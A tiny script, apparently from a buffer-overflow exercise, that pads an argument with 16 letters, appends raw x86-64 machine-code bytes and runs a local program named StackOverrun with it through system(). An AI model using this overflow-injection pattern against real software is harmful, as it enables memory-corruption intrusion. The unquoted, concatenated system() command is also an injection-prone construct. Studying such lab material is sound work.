$arg = "ABCDEFGHIJKLMNOP"."\x55\x48\x89\xe5\x48\x83\xec\x10\x31\xff\xe8\x1d\x00\x00\x00\x48\x8d\x3d\x46\x00\x00\x00\x89\x45\xfc\xe8\x14\x00\x00\x00\x31\xc9\x89\x45\xf8\x89\xc8\x48\x83\xc4\x10\x5d\xc3";
$cmd = "out/StackOverrun ".$arg;

system($cmd);
